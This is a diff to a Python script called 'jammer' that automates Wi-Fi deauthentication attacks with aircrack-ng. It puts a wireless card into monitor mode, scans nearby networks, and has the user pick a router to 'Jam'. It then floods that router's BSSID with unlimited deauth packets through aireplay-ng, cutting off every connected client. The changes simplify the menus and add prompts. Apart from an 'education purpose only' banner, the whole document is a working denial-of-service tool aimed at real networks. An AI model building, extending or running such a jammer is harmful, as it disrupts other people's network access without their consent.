@@ -8,9 +8,9 @@ import questionary
 import csv
 
 custom_style = questionary.Style([
-    ("qmark", "fg:#00ff00 bold"),     # green question mark
-    ("selected", "fg:#00ff00 bold"),  # green selected choice
-    ("pointer", "fg:#ff5f00 bold"),   # orange pointer
+    ("qmark", "fg:#00ff00 bold"),  
+    ("selected", "fg:#00ff00 bold"), 
+    ("pointer", "fg:#ff5f00 bold"),   
 ])
 
 
@@ -50,24 +50,21 @@ class jammer():
     
             --------------------------------------------------------------------------------        
             ----------------------Education purpose only for gods sake----------------------        
-            --------------------------------Versio-3.0--------------------------------------        
+            --------------------------------Versio-4.0--------------------------------------        
  
             --------------------------------------------------------------------------------        
             ------------------------------------USAGE---------------------------------------        
             ---                        Starts moniter interface                          ---        
             ---                            Runs airodump-ng                              ---        
-            ---                     Deauthenticates whole Access point                   ---        
-            ---            Deauthenticates specified client of the Access point          ---        
+            ---                     Deauthenticates whole Access point                   ---       
             ---                        revert to managed mode                            ---        
             --------------------------------------------------------------------------------        
-            ------------------------------------NOTE----------------------------------------        
-            ---                             Use small y/n                                ---        
-            --------------------------------------------------------------------------------  
+            ------------------------------------NOTE----------------------------------------      
           {END}""")
 
         print(f"""{YELLOW}
             ===========================Press enter to continue==============================      
-            =========================== Press ctrl + c to exit =============================         
+            ===========================Press ctrl + c to exit =============================         
 
         {END}""")
 
@@ -76,17 +73,21 @@ class jammer():
             sys.exit(1)  
 
         try:
-            print("Installing required packages...")
-            time.sleep(1)
-            distro = subprocess.run(['uname','-r'],stdout=subprocess.PIPE,text=True).stdout.strip().lower()
-            if "ubuntu" in distro or "kali" in distro or "debian" in distro :
-                subprocess.run(['sudo', 'apt', 'update'], check=True)
-                subprocess.run(['sudo', 'apt', 'install', 'aircrack-ng', '-y'], check=True)
-            
-            elif "arch" in distro or "manjaro" in distro :
-                subprocess.run(['sudo', 'pacman', '-S', 'aircrack-ng','--noconfirm'], check=True)
-            else:
-                print("Please install aircrack-ng manually.")
+            cont = input("")
+            if cont == "":
+                airmon = subprocess.run(["which","airmon-ng"],stdout=subprocess.PIPE, text=True)
+                if not airmon:
+                    print("Installing required packages...")
+                    time.sleep(1)
+                    distro = subprocess.run(['uname','-r'],stdout=subprocess.PIPE,text=True).stdout.strip().lower()
+                    if "ubuntu" in distro or "kali" in distro or "debian" in distro :
+                        subprocess.run(['sudo', 'apt', 'update'], check=True)
+                        subprocess.run(['sudo', 'apt', 'install', 'aircrack-ng', '-y'], check=True)
+                    
+                    elif "arch" in distro or "manjaro" in distro :
+                        subprocess.run(['sudo', 'pacman', '-S', 'aircrack-ng','--noconfirm'], check=True)
+                    else:
+                        print("Please install aircrack-ng manually.")
         except:
             print(f"{RED}Error installing aircrack-ng try to install manually ...{END}")
             sys.exit(1) 
@@ -102,17 +103,14 @@ class jammer():
         subprocess.check_call(['systemctl','restart','NetworkManager'],stdout=subprocess.PIPE,text=True)
         time.sleep(1)
         self.clear()
+        
     def try_again_from_start(self):
 
         self.interface_name()
         self.wifi_dump()
-        self.specific_dump()
         self.type_of_attack()
     
     def interface_name(self):
-        print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
-        subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
-        subprocess.check_call(['iwconfig'])
         try:
             result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             # Process the output to get the interface names
@@ -170,91 +168,91 @@ class jammer():
             #works as a delay or simply waits infinity long to get interrupt ctrl + c from user
             while True:
                 try:
-                    # Wait for the process to complete or handle Ctrl + C
                     process.wait()
                 except KeyboardInterrupt:
                     print("\nStopping the Wi-Fi dump...")
                     self.retrive_info(13)
-                    process.terminate()  # Terminate the process
-                    process.wait()       # Wait for the process to exit
+                    process.terminate() 
+                    process.wait()      
                     break
         finally:
             pass
 
     def try_again(self):
         self.clear()
-        
-        tryagain=input(f"{RED}Try again ? (y/n):{END}").strip()
-        
-        if tryagain == 'y':
+        tryagain = questionary.confirm("Try Again?").ask()
+        if tryagain:
             self.start_again()
+        elif tryagain is None:
+            print(f"{RED}Interrupt by user{END}")
+            self.revert_managed_mode()
+            return
         else :
-            pass
-
+            self.revert_managed_mode()
+    
     def start_again(self):
 
         self.wifi_dump()
-        self.specific_dump()
         self.type_of_attack()
 
     def type_of_attack(self):
-        self.retrive_info(13)
-        print(self.essid)
-        
-        options = questionary.select(
-            "Enter the BSSID type:",
-            choices=self.essid,
-            style=custom_style
-        ).ask()
-        
-        index = self.essid.index(options)
-        print(index)
-        self.retrive_info(0)
-        print(self.bssid)
-        current_bssid = self.bssid[index]
-        print(current_bssid)
-        self.retrive_info(3)
-        current_channel = self.channel[index]
-        print(current_channel)
-        subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
-    
-        options = questionary.select(
-            "Enter the attack type:",
-            choices=[f"1. Specify the client and send deauth packets to that client\n", f"2. Send deauth packets to the whole Wi-Fi (knock all clients off the router)\n", f"3. Exit\nEnter: "],
-            style=custom_style
-        ).ask()
-        if "." in options:
-            option = options.split(".")[0]
-            print(option)
-    
         try:
-            match option:
-                    case "1":
-                        station = input(f"{YELLOW}Enter the client's station address (near the targeted BSSID: {self.bssid}): {END}").strip()
-                        process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', self.bssid, '-c', station])
-                        process.wait()  # Wait for the process to finish
-                    case "2":
-                        process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
-                        process.wait()
-                    case "3":
-                        print(f"{RED}Exiting...{END}")
-                        revert= input(f"{GREEN}Would you like to revert to managed mode [y/n]:").strip()
-                        if revert == 'y':
-                            self.revert_managed_mode()
-                        else:
-                            sys.exit(0)
+            self.retrive_info(13)
+            options = questionary.select(
+                "Select the router you want to Jam!!",
+                choices=self.essid[1:],
+                style=custom_style
+            ).ask()
+            if options is None:
+                print(f"{RED}Attack type selection cancelled by user{END}")
+                self.revert_managed_mode()
+                return
+            index = self.essid.index(options)
+            self.retrive_info(0)
+            current_bssid = self.bssid[index]
+            self.retrive_info(3)
+            current_channel = self.channel[index]
+            subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
+            
+            options = questionary.select(
+                "Enter the attack type:",
+                choices=[f"1. Send deauth packets to the whole Wi-Fi (knock all clients off the router)", f"2. Exit"],
+                style=custom_style
+            ).ask()
+            if options is None:
+                print(f"{RED}Attack type selection cancelled by user{END}")
+                self.revert_managed_mode()
+                return
+            if "." in options:
+                option = options.split(".")[0]
+                print(option)
+        
+            try:
+                match option:
+                        case "1":
+                            self.revert_status = True
+                            process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
+                            process.wait()
+                        case "2":
+                            print(f"{RED}Exiting...{END}")
+                            self.try_again()
                         
+            except KeyboardInterrupt:
+                    print(f"{RED}\nStopping the deauthentication...{END}")
+                    time.sleep(1)
+                    process.terminate()  # Terminate the process
+                    process.wait()  # Wait for it to terminate
+                    self.try_again()
+            
         except KeyboardInterrupt:
-                print(f"{RED}\nStopping the deauthentication...{END}")
-                time.sleep(1)
-                process.terminate()  # Terminate the process
-                process.wait()  # Wait for it to terminate
-        finally:
-                self.try_again()
+            wannaexit = questionary.confirm("Wanna Stop?")
+            if wannaexit:
+                self.revert_managed_mode()
+            else:
+                pass
 
-
-wifi = jammer() 
-wifi.interface_name()
-wifi.wifi_dump()
-# wifi.specific_dump()
-wifi.type_of_attack()
+if __name__ == "__main__":
+    wifi = jammer() 
+    wifi.interface_name()
+    wifi.wifi_dump()
+    wifi.type_of_attack()   
